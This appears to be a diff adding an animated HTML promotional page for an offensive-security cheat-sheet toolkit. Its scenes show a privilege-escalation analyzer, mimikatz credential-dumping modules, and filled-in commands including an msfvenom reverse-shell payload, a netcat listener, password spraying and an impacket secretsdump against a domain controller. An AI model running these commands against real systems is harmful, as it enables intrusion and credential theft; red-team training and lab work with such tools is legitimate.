+            <!-- ── S5: PrivEsc ── -->
+            <div class="scene s5" id="s5">
+              <div class="sh2">
+                <div class="si priv">🔼</div>
+                <div><div class="stitle">PrivEsc Toolkit</div><div class="ssub">Smart analyzer — paste output, get ranked exploits</div></div>
+                <div class="scnt" style="color:var(--r)">1000+ cmds</div>
+              </div>
+              <div class="analyzer">
+                <div class="az-t">🧠 Smart Analyzer — paste systeminfo or uname -a</div>
+                <div class="az-input">Host Name:     VICTIM-PC
+OS Name:       Microsoft Windows 10 Pro
+OS Version:    10.0.19041 Build 19041
+Hotfix(ID):    KB4512578
+Token:         SeImpersonatePrivilege   Enabled
+Token:         SeAssignPrimaryTokenPriv Enabled</div>
+              </div>
+              <div class="az-label">🔍 Auto-detected exploits (ranked by confidence):</div>
+              <div class="res-grid">
+                <div class="rc h"><div class="rc-t">🥔 PrintSpoofer</div><div class="rc-d">SeImpersonatePrivilege confirmed. Potato attack viable on Win10 19041.</div><div class="sev h">HIGH CONFIDENCE</div></div>
+                <div class="rc h"><div class="rc-t">🥔 GodPotato</div><div class="rc-d">Win10 19041 + SeImpersonate path confirmed. Download and run.</div><div class="sev h">HIGH CONFIDENCE</div></div>
+                <div class="rc m"><div class="rc-t">📦 PrintNightmare</div><div class="rc-d">OS 10.0.19041 — CVE-2021-34527 candidate. Check patch status.</div><div class="sev m">CHECK PATCH</div></div>
+              </div>
+            </div>
+
+            <!-- ── S6: Search ── -->
+            <div class="scene s6" id="s6">
+              <div class="search-active">
+                <span class="sa-icon">🔍</span>
+                <span class="sa-text">mimikatz</span>
+                <div class="cursor"></div>
+              </div>
+              <div class="sr-cnt">Found in <strong style="color:var(--t)">3 tools</strong> — keyword indexed across all 17 cheat sheets:</div>
+              <div class="sr-list">
+                <div class="sr"><div class="sr-ic" style="background:rgba(34,211,238,.1)">🎯</div><div class="sr-b"><div class="sr-t">AD Boom V2</div><div class="sr-n">Credential dumping, sekurlsa::logonpasswords, token elevate, PTH chains</div></div><div class="sr-m">mimikatz</div></div>
+                <div class="sr"><div class="sr-ic" style="background:rgba(34,211,238,.1)">🔄</div><div class="sr-b"><div class="sr-t">AD Lateral Movement</div><div class="sr-n">Pass-the-Hash, sekurlsa, golden/silver ticket forge, NTLM relay</div></div><div class="sr-m">mimikatz</div></div>
+                <div class="sr"><div class="sr-ic" style="background:rgba(248,113,113,.1)">🎭</div><div class="sr-b"><div class="sr-t">Token Privilege Arsenal</div><div class="sr-n">token::elevate, privilege::debug, lsadump::sam, lsadump::dcsync</div></div><div class="sr-m">mimikatz</div></div>
+              </div>
+              <div style="margin-top:10px;background:var(--bg1);border:1px solid var(--brd);border-radius:7px;padding:9px 12px;font:9px/1 -apple-system,sans-serif;color:var(--ts);display:flex;align-items:center;gap:16px;">
+                <span style="color:var(--c);font-family:monospace;font-size:10px">TIP</span>
+                <span>Press <span style="font-family:monospace;color:var(--c);font-size:10px">/</span> to focus search from anywhere &nbsp;·&nbsp; Search covers tool names, commands, aliases, and techniques</span>
+              </div>
+            </div>
+
+            <!-- ── S7: Variable Sync ── -->
+            <div class="scene s7" id="s7">
+              <div style="font:700 11px/1 'SF Mono',monospace;color:var(--c);margin-bottom:10px">// Set once → all 1000+ commands update instantly</div>
+              <div class="varbar">
+                <div class="vl">LHOST</div>
+                <div class="vi">10.10.14.5</div>
+                <div class="vl" style="margin-left:4px">LPORT</div>
+                <div class="vi" style="width:65px">4444</div>
+                <div class="vl" style="margin-left:4px">TARGET</div>
+                <div class="vi">10.10.11.200</div>
+                <div class="vapply">APPLY ALL</div>
+              </div>
+              <div class="cmd-list">
+                <div class="ci"><span>nxc smb <span class="ip">10.10.11.200</span> -u users.txt -p passwords.txt --shares</span><span class="cpy">⎘</span></div>
+                <div class="ci"><span>python3 bloodyAD.py --dc-ip <span class="ip">10.10.11.200</span> -d domain.local --host <span class="ip">10.10.11.200</span></span><span class="cpy">⎘</span></div>
+                <div class="ci"><span>msfvenom -p windows/x64/shell_reverse_tcp LHOST=<span class="ip">10.10.14.5</span> LPORT=<span class="ip">4444</span> -f exe -o shell.exe</span><span class="cpy">⎘</span></div>
+                <div class="ci"><span>nc -lvnp <span class="ip">4444</span> &nbsp;&nbsp;<span style="color:var(--ts)"># Ready on 10.10.14.5</span></span><span class="cpy">⎘</span></div>
+                <div class="ci"><span>impacket-secretsdump domain.local/admin@<span class="ip">10.10.11.200</span> -just-dc-ntlm</span><span class="cpy">⎘</span></div>
+              </div>
+            </div>
+
+            <!-- ── S8: End ── -->
+            <div class="scene s8" id="s8">
+              <div style="position:relative;z-index:1;text-align:center;">
+                <div class="end-n">mahdiesta</div>
+                <div class="end-t">Mahdiesta Arsenal<br><span style="color:var(--c)">Offensive Security Toolkit</span></div>
+                <div class="end-s" style="margin-top:6px">17 Interactive Cheat Sheets · 5000+ Commands · 100% Offline</div>
+                <div style="display:flex;justify-content:center;margin-top:14px;">
+                  <div class="end-link">⭐ &nbsp;github.com/mahdiesta/arsenal</div>
+                </div>
+                <div class="end-stats" style="justify-content:center;">
+                  <div class="es"><div class="es-n">17</div><div class="es-l">Cheat Sheets</div></div>
+                  <div class="es"><div class="es-n">5K+</div><div class="es-l">Commands</div></div>
+                  <div class="es"><div class="es-n">7</div><div class="es-l">Categories</div></div>
+                  <div class="es"><div class="es-n">100%</div><div class="es-l">Offline</div></div>
+                </div>
+              </div>
+            </div>
+
+          </div><!-- /mac-content -->
+        </div><!-- /mac-browser -->
+      </div><!-- /mac-bezel -->
+    </div><!-- /mac-lid -->
+    <div class="mac-base"></div>
+  </div><!-- /macbook -->
+
+  <!-- ═══ INFO PANEL ═══ -->
+  <div class="info-panel">
+
+    <!-- IC1: Intro -->
+    <div class="info-card active" id="ic1">
+      <div class="itag">🛡 Offensive Security</div>
+      <div class="ihead">Mahdiesta<br><span>Arsenal</span></div>
+      <div class="ibody">A self-contained interactive red team toolkit — fully offline, no dependencies, no setup.</div>
+      <div class="istats">
+        <div class="istat"><div class="istat-n">17</div><div class="istat-l">Cheat Sheets</div></div>
+        <div class="istat"><div class="istat-n">5K+</div><div class="istat-l">Commands</div></div>
+        <div class="istat"><div class="istat-n">7</div><div class="istat-l">Categories</div></div>
+      </div>
+    </div>
+
+    <!-- IC2: AD -->
+    <div class="info-card" id="ic2">
+      <div class="itag">🎯 Active Directory</div>
+      <div class="ihead">Complete <span>AD</span><br>Attack Chain</div>
+      <div class="ibody">From initial recon to domain compromise — every technique, every tool, in one place.</div>
+      <ul class="ibullets">
+        <li>AD Boom V2 — 325+ commands with decision trees</li>
+        <li>BloodHound Cypher query library + attack paths</li>
+        <li>ADCS ESC1–ESC16 full certificate attacks</li>
+        <li>NetExec — 261 commands across 9 protocols</li>
+        <li>DACL abuse chains with bloodyAD</li>
+        <li>34 MITRE-mapped lateral movement techniques</li>
+      </ul>
+    </div>
+
+    <!-- IC3: SQLi -->
+    <div class="info-card" id="ic3">
+      <div class="itag">💉 SQL Injection</div>
+      <div class="ihead">Full SQLi<br><span>Toolkit</span></div>
+      <div class="ibody">Every injection type covered — guided wizards take you from discovery to shell.</div>
+      <ul class="ibullets">
+        <li>10+ context-aware payload generators</li>
+        <li>WAF bypass transformer — stack multiple techniques</li>
+        <li>Union · Blind · Error-based · Stacked · OOB</li>
+        <li>Paste a working payload → Amplifier builds full chain</li>
+        <li>23 failure-mode corrections with root-cause diagnosis</li>
+        <li>SQLi → File Ops → Webshell → Reverse Shell flow</li>
+      </ul>
+    </div>
+
+    <!-- IC4: Web -->
+    <div class="info-card" id="ic4">
+      <div class="itag">🌐 Web Exploitation</div>
+      <div class="ihead">Full Web<br><span>Attack Suite</span></div>
+      <div class="ibody">4 specialized tools covering every web attack vector — recon to full compromise.</div>
+      <ul class="ibullets">
+        <li>XSS · LFI · RFI · SSRF · XXE · SSTI payloads</li>
+        <li>JWT forge, cookie decoder, session attacks</li>
+        <li>MFA / OTP bypass techniques</li>
+        <li>20-phase structured recon workflow</li>
+        <li>File upload bypass — extension, MIME, magic bytes</li>
+        <li>227 OS command injection techniques</li>
+      </ul>
+    </div>
+
+    <!-- IC5: PrivEsc -->
+    <div class="info-card" id="ic5">
+      <div class="itag">🔼 Privilege Escalation</div>
+      <div class="ihead">Smart<br><span>Analyzer</span></div>
+      <div class="ibody">Paste your systeminfo or uname output — get ranked exploit candidates automatically.</div>
+      <ul class="ibullets">
+        <li>Auto-detects OS version, build, and missing patches</li>
+        <li>Identifies dangerous token privileges instantly</li>
+        <li>Potato attack decision tree (Print / God / Sweet)</li>
+        <li>Windows: service, kernel, token, PATH, registry</li>
+        <li>Linux: SUID, cron, NFS, capabilities, writable paths</li>
+        <li>1000+ commands total across 2 tools</li>
+      </ul>
+    </div>
+
+    <!-- IC6: Search -->
+    <div class="info-card" id="ic6">
+      <div class="itag">🔍 Instant Search</div>
+      <div class="ihead">Find Any<br><span>Technique</span></div>
+      <div class="ibody">Type any tool, technique, CVE, or command — instantly see which cheat sheets cover it.</div>
+      <ul class="ibullets">
+        <li>Searches across all 17 tools simultaneously</li>
+        <li>Indexed at command level — not just titles</li>
+        <li>Press <span style="font-family:monospace;color:#22d3ee">/</span> from anywhere to focus search</li>
+        <li>Results show context, coverage, and direct links</li>
+        <li>Works 100% offline — no server needed</li>
+      </ul>
+    </div>
+
+    <!-- IC7: Variables -->
+    <div class="info-card" id="ic7">
+      <div class="itag">⚡ Variable Sync</div>
+      <div class="ihead">Set Once.<br><span>All Updates.</span></div>
+      <div class="ibody">Enter your attacker IP, target IP, and port once — every command across the entire toolkit updates live.</div>
+      <ul class="ibullets">
+        <li>LHOST · LPORT · TARGET auto-propagate everywhere</li>
+        <li>Affects 1000+ commands across all tools</li>
+        <li>Copy any command — it's already filled in</li>
+        <li>Saved in localStorage — persists across sessions</li>
+        <li>Zero manual editing. Zero typos.</li>
+      </ul>
+    </div>
+
+    <!-- IC8: CTA -->
+    <div class="info-card" id="ic8">
+      <div class="itag">⭐ Open Source</div>
+      <div class="ihead">Available<br><span>on GitHub</span></div>
+      <div class="ibody">Free to use, fork, and extend. Built in vanilla HTML — works in any browser, everywhere.</div>
+      <ul class="ibullets">
+        <li>100% offline — no internet required</li>
+        <li>No npm, no build system, no framework</li>
+        <li>Dark / Light theme — press <span style="font-family:monospace;color:#22d3ee">t</span> to toggle</li>
+        <li>Keyboard shortcuts for power users</li>
+        <li>Open source — fork it and make it yours</li>
+      </ul>
+      <div class="github-pill">⭐ &nbsp;github.com/mahdiesta/arsenal</div>
+    </div>
+
+  </div><!-- /info-panel -->
+
+  <!-- Progress bar -->
+  <div class="prog-wrap">
+    <div class="prog-track"><div class="prog-fill" id="prog"></div></div>
+    <div class="prog-time" id="timer">1:00</div>
+  </div>
+
+  <!-- Scene dots -->
+  <div class="scene-dots" id="dots"></div>
+
+</div><!-- /canvas -->
+
+<script>
+const TOTAL = 60000;
+const scenes = [
+  { s:'s1', ic:'ic1', start:0,     end:8000,  url:'cybershells.com/notmain/TheCompleteMahdiestaArsenal/',       hud:'mahdiesta@arsenal:~# ls tools/' },
+  { s:'s2', ic:'ic2', start:8000,  end:16500, url:'cybershells.com/.../index.html#active-directory',            hud:'mahdiesta@arsenal:~# cat ad/tools.list' },
+  { s:'s3', ic:'ic3', start:16500, end:25000, url:'cybershells.com/.../sqliv17.html',                           hud:'mahdiesta@arsenal:~# ./sqli-wizard --union' },
+  { s:'s4', ic:'ic4', start:25000, end:33000, url:'cybershells.com/.../WebArsenal.html',                        hud:'mahdiesta@arsenal:~# ls web/' },
+  { s:'s5', ic:'ic5', start:33000, end:41000, url:'cybershells.com/.../MahiestaPrivEsc/privesc.html',           hud:'mahdiesta@arsenal:~# ./privesc --analyze systeminfo.txt' },
+  { s:'s6', ic:'ic6', start:41000, end:49000, url:'cybershells.com/.../index.html?q=mimikatz',                  hud:'mahdiesta@arsenal:~# grep -r "mimikatz" tools/' },
+  { s:'s7', ic:'ic7', start:49000, end:55000, url:'cybershells.com/.../ADCS.html',                              hud:'mahdiesta@arsenal:~# export LHOST=10.10.14.5 LPORT=4444' },
+  { s:'s8', ic:'ic8', start:55000, end:60000, url:'github.com/mahdiesta/arsenal',                               hud:'mahdiesta@arsenal:~# echo "⭐ Star the repo"' },
+];
+
+// Build scene dots
+const dotsEl = document.getElementById('dots');
+scenes.forEach((_,i) => {
+  const d = document.createElement('div');
+  d.className = 'sdot' + (i===0?' on':'');
+  d.id = 'dot'+i;
+  dotsEl.appendChild(d);
+});
+
+let startTime = null;
+let curIdx = -1;
+
+function activate(idx) {
+  if (curIdx === idx) return;
+  curIdx = idx;
+  const sc = scenes[idx];
+  document.querySelectorAll('.scene').forEach(el => el.classList.remove('active'));
+  document.querySelectorAll('.info-card').forEach(el => el.classList.remove('active'));
+  document.querySelectorAll('.sdot').forEach((el,i) => el.classList.toggle('on', i===idx));
+  document.getElementById(sc.s)?.classList.add('active');
+  document.getElementById(sc.ic)?.classList.add('active');
+  document.getElementById('url-txt').textContent = sc.url;
+  document.getElementById('hud-text').textContent = sc.hud;
+}
+
+function tick(ts) {
+  if (!startTime) startTime = ts;
+  const elapsed = Math.min(ts - startTime, TOTAL);
+  const pct = (elapsed / TOTAL) * 100;
+
+  document.getElementById('prog').style.width = pct + '%';
+
+  const rem = Math.max(0, Math.ceil((TOTAL - elapsed) / 1000));
+  document.getElementById('timer').textContent = Math.floor(rem/60) + ':' + String(rem%60).padStart(2,'0');
+
+  for (let i = 0; i < scenes.length; i++) {
+    if (elapsed >= scenes[i].start && elapsed < scenes[i].end) { activate(i); break; }
+  }
+
+  if (elapsed < TOTAL) requestAnimationFrame(tick);
+  else activate(scenes.length - 1);
+}
+
+// Auto-start after 1.5s
+setTimeout(() => { if (!startTime) requestAnimationFrame(tick); }, 1500);
+// Or click to start
+document.addEventListener('click', () => { if (!startTime) requestAnimationFrame(tick); }, {once:true});
+</script>
+</body>
+</html>
